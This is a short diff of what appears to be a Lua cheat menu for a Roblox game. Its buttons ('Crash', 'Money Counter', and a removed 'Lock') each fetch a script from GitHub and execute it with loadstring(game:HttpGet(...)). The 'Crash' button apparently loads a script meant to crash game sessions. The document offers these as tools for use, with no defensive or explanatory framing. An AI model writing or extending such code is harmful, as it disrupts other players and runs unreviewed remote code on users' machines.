@@ -10,10 +10,6 @@ MainSection:NewButton("Crash", "Crash", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/22kristina/dhcrash_gen2/main/crash", true))()
 end)
 
-MainSection:NewButton("Lock", "Lock", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/farthefarter/e/main/e"))()
-end)
-
 MainSection:NewButton("Money Counter", "Money Counter", function()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/OG5/IkuScripts/main/DH/MoneyCounter', true))()
 end)
